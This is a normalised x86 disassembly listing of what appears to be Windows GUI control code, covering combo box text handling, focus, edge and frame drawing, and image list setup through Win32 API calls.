lea eax [ ebp - 0x10 ]
call sub_45cf28
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45bc98
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x2d0 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2d0 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0xc ]
call sub_43a904
cmp al 0x2
je r-xdata
test al al
je r-xdata
lea eax [ ebp - 0x54 ]
movzx edx [ ebx ]
call sub_449e98
mov ecx [ ebp - 0x54 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x2d0 ]
lea eax [ ebp - 0xc ]
call sub_44a0e8
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2d0 ]
mov ecx [ ebp - 0x10 ]
mov edx 0x1
call sub_44a368
mov eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x50 ]
movzx edx [ ebx ]
call sub_449e98
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0xc ]
pop edx
call sub_44a0e8
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_45bcbc
mov eax [ ebp - 0x4 ]
add eax 0x2d0
mov ecx 0x1
mov edx esi
call sub_44a438
sub esi 0x4
mov esi [ esi ]
mov edx [ ebp - 0x4 ]
add edx 0x2d0
mov ecx 0x1
xchg edx eax
call sub_44a438
sub eax 0x4
mov eax [ eax ]
dec esi
lea eax [ ebp - 0x8 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_44a368
push 0x0
push 0xffffffff
push 0x14e
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call SendMessageW
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0x14 ]
inc edx
mov ecx 0x7fffffff
mov eax [ ebp - 0xc ]
call sub_44a368
mov ecx [ ebp - 0x44 ]
lea eax [ ebp - 0x40 ]
mov edx [ ebp - 0x8 ]
call sub_44a0e8
mov edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_48dfa0
mov edi esi
dec edi
movzx edi di
mov eax edi
shl edi 0x10
or eax edi
push eax
push 0x0
push 0x142
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call SendMessageW
lea edx [ ebp - 0x48 ]
mov eax [ ebp - 0x4 ]
call sub_48df68
mov edx [ ebp - 0x48 ]
mov eax [ ebp - 0x4 ]
add eax 0x2d0
call sub_449d2c
jmp r-xdata
xor eax eax
jmp r-xdata
cmp ax 0xdfff
jbe r-xdata
movzx eax [ ebx ]
cmp ax 0xd800
jb r-xdata
test al al
je r-xdata
mov al 0x1
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45d414
test al al
je r-xdata
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
lea eax [ ebp - 0x30 ]
push eax
call PeekMessageW
test eax eax
je r-xdata
mov [ ebx ] 0x0
cmp [ ebp - 0x2c ] 0x102
jne r-xdata
lea eax [ ebp - 0x5c ]
movzx edx [ ebp - 0x28 ]
call sub_449e98
mov ecx [ ebp - 0x5c ]
lea eax [ ebp - 0x58 ]
mov edx [ ebp - 0xc ]
call sub_44a0e8
mov edx [ ebp - 0x58 ]
mov eax [ ebp - 0x4 ]
call sub_45d414
test al al
je r-xdata
push 0x1
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
lea eax [ ebp - 0x30 ]
push eax
call PeekMessageW
mov [ ebx ] 0x0
jmp r-xdata
sub_45d414
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_45d64a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
test eax eax
jne r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_496868
or ecx 0xffffffff
mov edx 0x14c
call sub_41f080
mov esi eax
cmp esi 0xffffffff
setne [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov [ ebp - 0x9 ] 0x0
or edx 0xffffffff
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax ebx
mov si 0xffb0
call sub_4483f8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d651
lea eax [ ebp - 0x18 ]
call j_sub_449348
lea eax [ ebp - 0x14 ]
mov edx 0x2
call j_sub_44936c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_44936c
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
cmp esi eax
setne [ ebp - 0xa ]
cmp [ ebx + 0x2f0 ] 0x0
je r-xdata
push 0x0
push esi
push 0x14e
mov eax ebx
call sub_496868
push eax
call SendMessageW
movzx eax [ ebx + 0x2d6 ]
sub al 0x2
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x29c ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
inc eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
lea eax [ ebx + 0x2d0 ]
mov edx [ ebp - 0x4 ]
call sub_449d2c
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebx + 0x29c ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x14f
mov eax ebx
call sub_496868
push eax
call SendMessageW
mov eax ebx
mov si 0xffeb
call sub_4483f8
mov eax ebx
mov si 0xffaf
call sub_4483f8
mov esi eax
test esi esi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax [ ebp - 0x8 ]
call sub_44a368
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_44a0e8
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_48dfa0
mov eax ebx
call sub_496868
mov edi eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub esi 0x4
mov esi [ esi ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov esi eax
test esi esi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax ebx
call sub_48df68
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
sub esi 0x4
mov esi [ esi ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
movzx edx si
movzx eax ax
shl eax 0x10
or edx eax
push edx
push 0x0
push 0x142
push edi
call SendMessageW
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
sub_45d67c
push ebx
push esi
push edi
push ebp
mov esi eax
mov ebx [ edx + 0x8 ]
movzx edi [ ebx + 0x10 ]
mov ebp [ ebx + 0x10 ]
test ebp 0x1000
je r-xdata
test ebp 0x20
je r-xdata
or di 0x1000
mov edx [ ebx + 0x18 ]
mov eax [ esi + 0x260 ]
call sub_46e950
mov edx [ esi + 0x64 ]
mov eax [ esi + 0x260 ]
call sub_46e7e4
mov edx [ esi + 0x1b8 ]
mov eax [ esi + 0x260 ]
call sub_46e800
cmp [ ebx + 0x8 ] 0x0
jl r-xdata
or di 0x20
mov ebp [ ebx + 0x8 ]
test ebp ebp
jl r-xdata
test di 0x1
je r-xdata
lea edx [ ebx + 0x1c ]
mov eax [ esi + 0x260 ]
call sub_46e300
push edi
lea ecx [ ebx + 0x1c ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x12c ]
jmp r-xdata
mov eax [ esi + 0x260 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_46df1c
mov eax [ esi + 0x260 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_46d5ac
xor edx edx
mov eax [ esi + 0x260 ]
call sub_46e950
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x1c ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call DrawFocusRect
test di 0x10
je r-xdata
sub_45d754
push ebx
push esi
push ecx
mov edx [ edx + 0x8 ]
mov ebx edx
mov edx [ eax + 0x298 ]
mov [ ebx + 0x10 ] edx
cmp [ eax + 0x2d6 ] 0x4
jne r-xdata
pop edx
pop esi
pop ebx
retn
mov edx [ eax + 0x298 ]
mov [ esp ] edx
mov ecx esp
mov edx [ ebx + 0x8 ]
mov esi [ eax ]
call [ esi + 0x130 ]
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
sub_45d790
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_48d12c
cmp al 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_48fcfc
mov eax ebx
call sub_48e1d8
test al al
je r-xdata
cmp [ ebx + 0x2d6 ] 0x2
jne r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_477028
test eax eax
je r-xdata
push 0x15
call GetSystemMetrics
mov edx [ ebx + 0x48 ]
sub edx eax
movsx eax [ esi + 0x8 ]
cmp edx eax
jle r-xdata
cmp ebx [ eax + 0x278 ]
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_48e71c
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_48e1e8
sub_45d80c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi ]
add eax 0xffff42ce
sub eax 0x7
jae r-xdata
mov edx esi
mov eax ebx
call sub_45c350
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebx + 0x2d6 ] 0x2
jae r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x1b8 ]
call sub_46df70
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_45d86c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_494494
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_46e0ac
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45da9c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_48c730
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ ebx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_46df1c
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_46e33c
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_46e33c
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4481b0
retn
xor esi esi
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov eax [ ebx + 0x1ac ]
add esi eax
test esi esi
jne r-xdata
mov eax [ ebx + 0x1ac ]
add esi eax
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_48d81c
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_46e8c8
push eax
call GetWindowLongW
mov edi eax
test [ ebx + 0x1a6 ] 0x1
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ ebx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_46df1c
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_46e33c
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_46e33c
test [ ebx + 0x1a6 ] 0x2
je r-xdata
sub [ ebp - 0x24 ] esi
test [ ebx + 0x1a6 ] 0x4
je r-xdata
sub [ ebp - 0x20 ] esi
test edi 0x200000
je r-xdata
add [ ebp - 0x1c ] esi
test [ ebx + 0x1a6 ] 0x8
je r-xdata
push 0x14
call GetSystemMetrics
add [ ebp - 0x1c ] eax
test edi 0x100000
je r-xdata
add [ ebp - 0x18 ] esi
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
movzx eax [ ebx + 0x1a6 ]
movzx edx [ ebx + 0x1a9 ]
or eax [ edx * 4 + rw-data ]
movzx edx [ ebx + 0x1e1 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
movzx eax [ ebx + 0x1a7 ]
mov eax [ eax * 4 + rw-data ]
movzx edx [ ebx + 0x1a8 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_46e8c8
push eax
call DrawEdge
push 0xa
call GetSystemMetrics
mov edx [ ebp - 0xc ]
sub edx eax
mov [ ebp - 0x14 ] edx
cmp [ ebx + 0x2d6 ] 0x1
je r-xdata
push 0x15
call GetSystemMetrics
add [ ebp - 0x18 ] eax
mov eax ebx
call sub_45bc98
test al al
je r-xdata
push 0x4005
push 0x3
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_46e8c8
push eax
call DrawFrameControl
push 0x4005
push 0x3
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_46e8c8
push eax
call DrawFrameControl
jmp r-xdata
sub_45daac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_490eec
mov eax esi
mov edx [ r-xdata ]
call sub_4483ac
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_45dad0
push ebx
mov ebx eax
mov eax ebx
call sub_4513cc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xdc ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4483ac
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45db08
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x260 ] 0x1
xor edx edx
push ebp
push sub_45db5e
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x260 ] 0x0
retn
sub_45db6c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_490f20
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x1c4 ] 0x0
sub_45dbc0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_497514
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
movzx edx [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xdc ]
test al al
jne r-xdata
sub_45dc18
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x68 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45dc3c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_4936a0
mov eax ebx
mov si 0xffb3
call sub_4483f8
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x260 ] 0x1
mov eax ebx
call sub_496868
push eax
call SetFocus
mov [ ebx + 0x260 ] 0x0
mov eax ebx
mov si 0xffb3
call sub_4483f8
test al al
je r-xdata
cmp [ ebx + 0x260 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_45dcb4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
call sub_44c2c8
mov edi eax
mov eax ebx
call sub_44cfd0
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_496868
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_44c568
cmp [ eax + 0x254 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov eax ebx
call sub_48ab2c
jmp r-xdata
push 0x5
call GetStockObject
mov [ esi + 0xc ] eax
jmp r-xdata
sub_45dd1c
push ebx
push esi
mov esi edx
mov ebx eax
call sub_44c2c8
call sub_44c3d4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_494888
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_45dd48
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4926c0
cmp [ ebx + 0x261 ] 0x0
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x2000
sub_45dd80
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_424dc0
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax + 0x10 ]
mov [ ebx + 0x10 ] edx
mov edx [ eax + 0xc ]
mov [ ebx + 0xc ] edx
mov edx [ eax + 0x4 ]
mov [ ebx + 0x4 ] edx
mov eax [ eax + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_45dddc
sub edx 0x1
jb r-xdata
cmp ecx [ eax + 0x10 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x10 ] ecx
mov edx [ eax ]
call [ edx + 0xc ]
retn
cmp ecx [ eax + 0xc ]
je r-xdata
dec edx
je r-xdata
mov [ eax + 0xc ] ecx
mov edx [ eax ]
call [ edx + 0xc ]
retn
cmp ecx [ eax + 0x4 ]
je r-xdata
dec edx
je r-xdata
mov [ eax + 0x4 ] ecx
mov edx [ eax ]
call [ edx + 0xc ]
retn
cmp ecx [ eax + 0x8 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x8 ] ecx
mov edx [ eax ]
call [ edx + 0xc ]
sub_45de24
push ebx
mov ebx eax
mov eax ebx
call sub_451444
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4483ac
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x28 ]
cmp eax [ edx + 0x28c ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45de5c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x28 ]
call sub_45e4b0
sub_45de7c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_45db6c
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov edx 0x4b
mov eax ebx
call sub_48d5f8
mov edx 0x19
mov eax ebx
call sub_48d62c
mov dl 0x1
mov eax ebx
call sub_496b44
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov esi eax
mov [ ebx + 0x288 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_45e948
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov esi eax
mov [ ebx + 0x290 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_45e964
xor eax eax
mov [ ebx + 0x298 ] eax
lea eax [ ebx + 0x26c ]
xor edx edx
call sub_449d2c
mov [ ebx + 0x274 ] 0xffffffff
mov [ ebx + 0x27c ] 0x0
mov [ ebx + 0x280 ] 0xffffffff
mov [ ebx + 0x284 ] 0x0
mov [ ebx + 0x28c ] 0xffffffff
mov [ ebx + 0x2a0 ] 0xffffffff
mov [ ebx + 0x2a4 ] 0xffffffff
mov [ ebx + 0x2a8 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_45df80
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_45dbc0
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x80 ]
mov eax edi
call sub_45e4b0
cmp [ edi + 0x28c ] 0xffffffff
jne r-xdata
sub_45dfc4
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_477028
test eax eax
je r-xdata
mov eax ebx
call sub_48fba8
pop ebx
retn
mov edx [ ebx + 0x29c ]
mov [ eax + 0x2a4 ] edx
sub_45e00c
push ebx
push esi
mov ebx eax
mov edx 0x1
mov eax 0x5
call sub_43a7f0
test al al
je r-xdata
xor edx edx
mov eax ebx
call sub_45e518
cmp [ ebx + 0x294 ] 0x0
je r-xdata
mov eax ebx
call sub_496c14
test al al
je r-xdata
cmp [ ebx + 0x298 ] 0x0
jne r-xdata
mov esi [ ebx + 0x298 ]
mov eax [ ebx + 0x294 ]
movzx edx [ eax + 0x68 ]
mov eax esi
call sub_44f7cc
mov eax [ ebx + 0x294 ]
movzx eax [ eax + 0x41 ]
mov [ esi + 0x41 ] al
mov eax [ ebx + 0x294 ]
movzx eax [ eax + 0x43 ]
mov [ esi + 0x43 ] al
mov eax [ ebx + 0x294 ]
movzx edx [ eax + 0x40 ]
mov eax esi
call sub_44fe14
mov eax [ ebx + 0x294 ]
movzx edx [ eax + 0x42 ]
mov eax esi
call sub_44f40c
mov eax [ ebx + 0x294 ]
mov ecx [ eax + 0x30 ]
mov edx [ eax + 0x34 ]
mov eax esi
call sub_44f7ec
mov eax esi
call sub_44f2fc
test al al
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44f134
mov [ ebx + 0x298 ] eax
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax esi
call sub_44f4cc
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_496844
jmp r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x298 ]
call sub_44f4cc
mov edx eax
mov eax ebx
call sub_45e518
pop esi
pop ebx
retn
mov eax [ ebx + 0x294 ]
call sub_44f4cc
push eax
call ImageList_GetBkColor
call sub_45dfec
mov edx eax
mov eax esi
call sub_44f794
mov eax [ ebx + 0x294 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x48 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xec ]
cmp [ ebx + 0x28c ] 0xffffffff
je r-xdata
sub_45e150
push ebx
mov ebx eax
mov edx 0x1
mov eax 0x5
call sub_43a7f0
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x28c ] 0xffffffff
je r-xdata
mov eax [ ebx + 0x298 ]
call sub_44f788
mov ecx [ ebx + 0x28c ]
mov edx [ ebx + 0x294 ]
mov eax [ ebx + 0x298 ]
call sub_44fc50
mov eax [ ebx + 0x280 ]
cmp eax 0xffffffff
je r-xdata
mov ecx [ ebx + 0x28c ]
mov edx [ ebx + 0x294 ]
mov eax [ ebx + 0x298 ]
call sub_44fc50
mov ecx eax
mov edx [ ebx + 0x294 ]
mov eax [ ebx + 0x298 ]
call sub_44fc50
jmp r-xdata
mov ecx [ ebx + 0x28c ]
mov edx [ ebx + 0x294 ]
mov eax [ ebx + 0x298 ]
call sub_44fc50
mov ecx eax
mov edx [ ebx + 0x294 ]
mov eax [ ebx + 0x298 ]
call sub_44fc50
jmp r-xdata
mov eax [ ebx + 0x2a0 ]
cmp eax 0xffffffff
je r-xdata
mov ecx [ ebx + 0x28c ]
mov edx [ ebx + 0x294 ]
mov eax [ ebx + 0x298 ]
call sub_44fc50
mov ecx eax
mov edx [ ebx + 0x294 ]
mov eax [ ebx + 0x298 ]
call sub_44fc50
jmp r-xdata
mov eax [ ebx + 0x274 ]
cmp eax 0xffffffff
je r-xdata
mov ecx [ ebx + 0x28c ]
mov edx [ ebx + 0x294 ]
mov eax [ ebx + 0x298 ]
call sub_44fc50
mov ecx eax
mov edx [ ebx + 0x294 ]
mov eax [ ebx + 0x298 ]
call sub_44fc50
jmp r-xdata
mov eax [ ebx + 0x2a4 ]
cmp eax 0xffffffff
je r-xdata
sub_45e27c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax edi
call sub_496c14
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x6
jl r-xdata
movzx eax bl
mov esi [ eax * 4 + rw-data ]
movzx eax [ edi + 0x2a8 ]
dec al
je r-xdata
push 0x1
push esi
push 0xf4
mov eax edi
call sub_496868
push eax
call SendMessageW
movzx eax bl
mov esi [ eax * 4 + rw-data ]
jmp r-xdata
dec al
je r-xdata
push 0xfffffff0
mov eax edi
call sub_496868
push eax
call GetWindowLongW
and eax 0xf
cmp esi eax
je r-xdata
movzx eax bl
mov esi [ eax * 4 + rw-data ]
jmp r-xdata
jmp r-xdata
movzx eax bl
mov esi [ eax * 4 + rw-data ]
jmp r-xdata
sub_45e308
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x26c ]
call j_sub_44a294
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x26c ]
mov edx esi
call sub_449d2c
mov eax ebx
call sub_496c14
test al al
je r-xdata
cmp [ ebx + 0x2a8 ] 0x1
jne r-xdata
mov eax ebx
call sub_45e914
sub_45e348
push ebx
mov ebx eax
mov [ ebx + 0x270 ] dl
mov eax ebx
call sub_496c14
test al al
je r-xdata
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_477028
test eax eax
je r-xdata
mov edx [ eax + 0x278 ]
push edx
xor ecx ecx
mov edx 0xb007
call sub_48f2b0
sub_45e380
push esi
mov esi eax
cmp edx [ esi + 0x274 ]
je r-xdata
pop esi
retn
mov [ esi + 0x274 ] edx
cmp [ esi + 0x298 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xec ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_45e3cc
push esi
mov esi eax
cmp dl [ esi + 0x27c ]
je r-xdata
pop esi
retn
mov [ esi + 0x27c ] dl
mov eax esi
call sub_496c14
test al al
je r-xdata
mov eax esi
call sub_45e404
cmp [ esi + 0x27c ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xe8 ]
sub_45e404
push ebx
mov ebx eax
xor edx edx
mov eax 0x6
call sub_43a7f0
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_496c14
test al al
je r-xdata
mov eax ebx
call sub_496868
cmp [ ebx + 0x27c ] 0x1
cmc
sbb edx edx
push edx
push 0x0
push 0x160c
push eax
call SendMessageW
sub_45e444
push esi
mov esi eax
cmp edx [ esi + 0x280 ]
je r-xdata
pop esi
retn
mov [ esi + 0x280 ] edx
cmp [ esi + 0x298 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xec ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_45e474
push ebx
push esi
mov esi eax
